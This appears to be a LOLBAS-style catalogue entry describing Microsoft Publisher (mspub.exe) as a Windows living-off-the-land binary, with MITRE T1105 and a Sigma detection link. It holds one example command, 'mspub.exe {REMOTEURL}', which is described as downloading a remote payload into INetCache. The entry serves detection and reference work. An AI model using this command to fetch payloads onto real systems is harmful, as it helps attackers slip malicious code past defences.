---
id: windows-download-mspub
namespace: windows:download:mspub
name: mspub
description: 'Microsoft Publisher Located at: C:\Program Files (x86)\Microsoft Office
  16\ClientX86\Root\Office16\MSPUB.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSPUB.exe;
  C:\Program Files (x86)\Microsoft Office\Office16\MSPUB.exe.'
author: Nir Chako
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- mspub
parameters: []
features:
- file-system
- local
- network-intensive
- pipes-stdout
- remote
- requires-root
execution:
  template: mspub
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server (It will download a remote payload
    and place it in INetCache.)
  command: mspub.exe {REMOTEURL}
references: []
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_mspub_download.yml
- type: ioc
  description: Suspicious Office application internet/network traffic
install:
- method: choco
  package_name: mspub
  commands:
  - choco install mspub
---

# mspub

mspub is a Windows LOLBin. Microsoft Publisher Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSPUB.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSPUB.exe; C:\Program Files (x86)\Microsoft Office\Office16\MSPUB.exe.
